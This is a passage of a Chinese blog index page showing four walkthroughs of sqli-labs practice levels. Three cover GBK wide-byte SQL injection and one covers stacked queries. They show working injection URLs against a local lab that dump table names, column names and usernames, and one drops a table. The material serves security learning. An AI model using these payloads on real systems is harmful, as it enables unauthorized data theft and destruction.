<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>栈桥仔</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="栈桥仔">
<meta property="og:url" content="https://zhanqiaozai.github.io/page/7/index.html">
<meta property="og:site_name" content="栈桥仔">
<meta property="article:author" content="zhanqiaozai">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">zhanqiaozai</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-sqli-labs关卡/sqli-labs第三十五关GET宽字节" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.377Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/">
        sqli-labs关卡/sqli-labs第三十五关GET宽字节
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="查看初始页面。"><a href="#查看初始页面。" class="headerlink" title="查看初始页面。"></a>查看初始页面。</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981792588.png" alt="1584981792588"></p>
<h4 id="查看源码，使用了gbk编码，-id并没有引号包裹"><a href="#查看源码，使用了gbk编码，-id并没有引号包裹" class="headerlink" title="查看源码，使用了gbk编码，$id并没有引号包裹"></a>查看源码，使用了gbk编码，$id并没有引号包裹</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981816345.png" alt="1584981816345"></p>
<h4 id="查看当前字段数，字段3返回正常"><a href="#查看当前字段数，字段3返回正常" class="headerlink" title="查看当前字段数，字段3返回正常"></a>查看当前字段数，字段3返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981857891.png" alt="1584981857891"></p>
<h4 id="字段4返回错误，说明当前字段为3"><a href="#字段4返回错误，说明当前字段为3" class="headerlink" title="字段4返回错误，说明当前字段为3"></a>字段4返回错误，说明当前字段为3</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981877153.png" alt="1584981877153"></p>
<h4 id="查看注入点"><a href="#查看注入点" class="headerlink" title="查看注入点"></a>查看注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981919225.png" alt="1584981919225"></p>
<h4 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981940257.png" alt="1584981940257"></p>
<h4 id="查看表，因为用的是gbk编码将security改为16进制数"><a href="#查看表，因为用的是gbk编码将security改为16进制数" class="headerlink" title="查看表，因为用的是gbk编码将security改为16进制数"></a>查看表，因为用的是gbk编码将security改为16进制数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584981997638.png" alt="1584981997638"></p>
<h4 id="查看users表"><a href="#查看users表" class="headerlink" title="查看users表"></a>查看users表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584982054583.png" alt="1584982054583"></p>
<h4 id="查看username字段"><a href="#查看username字段" class="headerlink" title="查看username字段"></a>查看username字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(username)from users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584982086080.png" alt="1584982086080"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第三十二关JSP环境宽字节" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.376Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/">
        sqli-labs关卡/sqli-labs第三十二关JSP环境宽字节
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>查看初始页面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584967761156.png" alt="1584967761156"></p>
<p>加上单引号查看报错信息，返回错误，引号中有一个反斜杠，可以判定为宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584967781936.png" alt="1584967781936"></p>
<p>可以先尝试将引号中按照要求加入反斜杠，再次查询，发现返回这么多反斜杠</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584967870233.png" alt="1584967870233"></p>
<p>id=1’———-&gt;id=1&#39;———&gt;id=1%5c%27</p>
<p>id=1%df’———id=1%df%5c%27———-&gt;id=1%DF5C%27——–&gt;id=1運’</p>
<p>其实就是利用gbk是多字节的编码，两个字节代表一个汉字</p>
<p>%df    %5c   组合出了一个  運 字</p>
<p>因此  可以注入</p>
<h5 id="将-df带入，页面返回正常"><a href="#将-df带入，页面返回正常" class="headerlink" title="将%df带入，页面返回正常"></a>将%df带入，页面返回正常</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968598018.png" alt="1584968598018"></p>
<p>查看当前字段数，字段4返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968639215.png" alt="1584968639215"></p>
<p>使用字段3，返回正确</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968661231.png" alt="1584968661231"></p>
<p>查看注入点，注入点2,3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968694716.png" alt="1584968694716"></p>
<p>查看当前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968713308.png" alt="1584968713308"></p>
<p>查看表名，在宽字节中不能使用  ‘security’ ，而需要使用database()来获取表名，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584968998081.png" alt="1584968998081"></p>
<p>也可以将security编码成16进制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584969393665.png" alt="1584969393665"></p>
<p>获取users表下的字段，还是使用16进制方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584969451372.png" alt="1584969451372"></p>
<p>查看suername字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1&amp;id&#x3D;1112%df\&#39; union select 1,2,group_concat(username)from users--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584969580473.png" alt="1584969580473"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第三十九关GET堆叠" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.374Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/">
        sqli-labs关卡/sqli-labs第三十九关GET堆叠
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>查看初始界面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035647060.png" alt="1585035647060"></p>
<p>加上单引号，页面只返回两个引号，说明$id没有包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035668650.png" alt="1585035668650"></p>
<p>查看一下源码，判断正确，$id没有引号包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035718189.png" alt="1585035718189"></p>
<p>使用堆叠，向数据库插入表，页面返回正常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用堆叠需要在 1 后面加分号分隔，说明这是两个语句，使用注释符将limit注释</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-39&#x2F;?id&#x3D;1 ;  create table crow like users --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035821792.png" alt="1585035821792"></p>
<p>在数据库中查看，插入成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035840392.png" alt="1585035840392"></p>
<p>删除crow 表，删除成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-39&#x2F;?id&#x3D;1 ;  drop table crow  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3GET%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585035869907.png" alt="1585035869907"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第三十三关GET宽字节" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.371Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/">
        sqli-labs关卡/sqli-labs第三十三关GET宽字节
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>查看最初界面。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584970985279.png" alt="1584970985279"></p>
<p>查看源码，使用单引号闭合</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584970995565.png" alt="1584970995565"></p>
<p>加上单引号查看，发现返回反斜杠，说明宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971075138.png" alt="1584971075138"></p>
<p>按照要求加入反斜杠，确定为宽字节注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971116599.png" alt="1584971116599"></p>
<p>加入%df，报错了，发现没有用注释符注释引号</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971178309.png" alt="1584971178309"></p>
<p>加上注释符，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971217764.png" alt="1584971217764"></p>
<p>查看字段数，4报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;1%df\&#39;  order by 4  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971252363.png" alt="1584971252363"></p>
<p>查看字段数3，页面回显正常，说明字段数正确</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971275954.png" alt="1584971275954"></p>
<p>查看注入点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,3  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971335124.png" alt="1584971335124"></p>
<p>查看当前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971427957.png" alt="1584971427957"></p>
<p>查看表，将security转换成16进制数，因为这是宽字节注入</p>
